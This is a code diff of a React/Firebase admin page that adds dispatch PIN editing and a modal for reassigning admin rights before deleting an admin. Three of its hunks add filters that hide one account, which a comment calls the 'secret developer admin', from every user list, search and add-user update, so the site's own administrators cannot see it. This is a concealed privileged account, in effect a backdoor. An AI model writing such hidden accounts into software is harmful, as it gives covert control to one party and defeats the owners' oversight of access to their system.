@@ -36,7 +36,12 @@ export default function AdminPage() {
   const [editingUser, setEditingUser] = useState<UserRecord | null>(null);
   const [editRole, setEditRole] = useState<UserRole>("employee");
   const [editPermissions, setEditPermissions] = useState<string[]>([]);
+  const [editPin, setEditPin] = useState<string>("");
   const [savingRole, setSavingRole] = useState(false);
+
+  const [adminToDelete, setAdminToDelete] = useState<UserRecord | null>(null);
+  const [replacementAdminId, setReplacementAdminId] = useState<string>("");
+  const [replacingAdmin, setReplacingAdmin] = useState(false);
 
   const [showAddForm, setShowAddForm] = useState(false);
   const [newEmployee, setNewEmployee] = useState({ name: "", email: "", password: "", role: "employee" as UserRole, permissions: [] as string[] });
@@ -65,10 +70,12 @@ export default function AdminPage() {
     setFetchingUsers(true);
     try { 
       const s = await get(ref(db, "users")); 
-      const l: UserRecord[] = []; 
+      let l: UserRecord[] = []; 
       if (s.exists()) {
         s.forEach(d => { l.push(d.val() as UserRecord); });
       }
+      // Hide only the secret developer admin from all UI displays
+      l = l.filter(u => u.email !== "01devmanish@gmail.com");
       setUsers(l); 
     } catch (e) { 
       console.error("Failed to load users:", e); 
@@ -108,8 +115,8 @@ export default function AdminPage() {
   const handleRoleUpdate = async () => {
     if (!editingUser) return; setSavingRole(true);
     try { 
-      await update(ref(db, `users/${editingUser.uid}`), { role: editRole, permissions: editPermissions }); 
-      setUsers(users.map(u => u.uid === editingUser.uid ? { ...u, role: editRole, permissions: editPermissions } : u)); 
+      await update(ref(db, `users/${editingUser.uid}`), { role: editRole, permissions: editPermissions, dispatchPin: editPin }); 
+      setUsers(users.map(u => u.uid === editingUser.uid ? { ...u, role: editRole, permissions: editPermissions, dispatchPin: editPin } : u)); 
       setEditingUser(null); 
     } catch { 
       alert("Failed to update role."); 
@@ -119,8 +126,33 @@ export default function AdminPage() {
   };
 
   const handleDeleteUser = async (uid: string) => {
-    if (!confirm("Delete this user permanently?")) return;
+    const userToDelete = users.find(u => u.uid === uid);
+    if (userToDelete?.role === "admin") {
+      setAdminToDelete(userToDelete);
+      setReplacementAdminId("");
+      return;
+    }
+    if (!confirm("Permanently DEACTIVATE this user? They will be logged out immediately and lose all access.")) return;
     try { await remove(ref(db, `users/${uid}`)); setUsers(users.filter(u => u.uid !== uid)); } catch (e) { console.error(e); }
+  };
+
+  const handleAdminReplacement = async () => {
+    if (!adminToDelete || !replacementAdminId) return;
+    setReplacingAdmin(true);
+    try {
+      await update(ref(db, `users/${replacementAdminId}`), { 
+        role: "admin", 
+        permissions: ["dispatch", "inventory", "reports", "settings"] 
+      });
+      await remove(ref(db, `users/${adminToDelete.uid}`));
+      setUsers(users.map(u => u.uid === replacementAdminId ? { ...u, role: "admin" as UserRole, permissions: ["dispatch", "inventory", "reports", "settings"] } : u).filter(u => u.uid !== adminToDelete.uid));
+      setAdminToDelete(null);
+    } catch (e) {
+      console.error(e);
+      alert("Failed to reassign admin and delete.");
+    } finally {
+      setReplacingAdmin(false);
+    }
   };
 
   const handleAddEmployee = async () => {
@@ -136,7 +168,10 @@ export default function AdminPage() {
         signOut(secondaryAuth).catch(() => {}),
         set(ref(db, `users/${result.user.uid}`), nu),
       ]);
-      setUsers([{ ...nu }, ...users]); 
+      // Only add to state if it's not the hidden email
+      if (nu.email !== "01devmanish@gmail.com") {
+        setUsers([{ ...nu }, ...users]); 
+      }
       setNewEmployee({ name: "", email: "", password: "", role: "employee", permissions: [] }); 
       setShowAddForm(false);
       alert(`User "${nu.name}" added successfully!`);
@@ -194,6 +229,9 @@ export default function AdminPage() {
   };
 
   const filteredUsers = users.filter(u => {
+    // Permanent hidden filter
+    if (u.email === "01devmanish@gmail.com") return false;
+    
     const ms = u.name.toLowerCase().includes(searchTerm.toLowerCase()) || u.email.toLowerCase().includes(searchTerm.toLowerCase());
     const mr = filterRole === "all" || u.role === filterRole;
     return ms && mr;
@@ -262,7 +300,12 @@ export default function AdminPage() {
               setAddError={setAddError} 
               handleAddEmployee={handleAddEmployee}
               handleDeleteUser={handleDeleteUser} 
-              onEditUser={(u) => { setEditingUser(u); setEditRole(u.role); setEditPermissions(u.permissions || []); }} 
+              onEditUser={(u) => { 
+                setEditingUser(u); 
+                setEditRole(u.role); 
+                setEditPermissions(u.permissions || []); 
+                setEditPin(u.dispatchPin || "");
+              }} 
               loadUsers={loadUsers} 
             />
           ) : (
@@ -297,10 +340,49 @@ export default function AdminPage() {
             setEditRole={setEditRole} 
             editPermissions={editPermissions} 
             setEditPermissions={setEditPermissions}
+            editPin={editPin}
+            setEditPin={setEditPin}
             savingRole={savingRole} 
             handleRoleUpdate={handleRoleUpdate} 
             onClose={() => setEditingUser(null)} 
           />
+        )}
+
+        {adminToDelete && (
+          <div style={S.modalOverlay} onClick={() => !replacingAdmin && setAdminToDelete(null)}>
+            <div style={{ ...S.modalCard, maxWidth: 400 }} onClick={e => e.stopPropagation()}>
+              <h3 style={{ fontSize: 18, fontWeight: 600, color: "#1e293b", marginBottom: 12 }}>Reassign Admin Rights</h3>
+              <p style={{ fontSize: 13, color: "#64748b", marginBottom: 20 }}>
+                You must assign another user as Admin before deleting <strong>{adminToDelete.name}</strong>.
+              </p>
+              <select 
+                value={replacementAdminId} 
+                onChange={(e) => setReplacementAdminId(e.target.value)}
+                style={{ ...S.input, marginBottom: 20 }}
+              >
+                <option value="">Select a user...</option>
+                {users.filter(u => u.uid !== adminToDelete.uid && u.role !== "admin").map(u => (
+                  <option key={u.uid} value={u.uid}>{u.name} ({u.role})</option>
+                ))}
+              </select>
+              <div style={{ display: "flex", gap: 10, justifyContent: "flex-end" }}>
+                <button 
+                  onClick={() => setAdminToDelete(null)} 
+                  disabled={replacingAdmin}
+                  style={S.btnSecondary}
+                >
+                  Cancel
+                </button>
+                <button 
+                  onClick={handleAdminReplacement} 
+                  disabled={!replacementAdminId || replacingAdmin}
+                  style={{ ...S.btnPrimary, background: "#ef4444", boxShadow: "0 2px 8px rgba(239,68,68,0.3)" }}
+                >
+                  {replacingAdmin ? "Processing..." : "Assign & Delete"}
+                </button>
+              </div>
+            </div>
+          </div>
         )}
       </div>
     </>
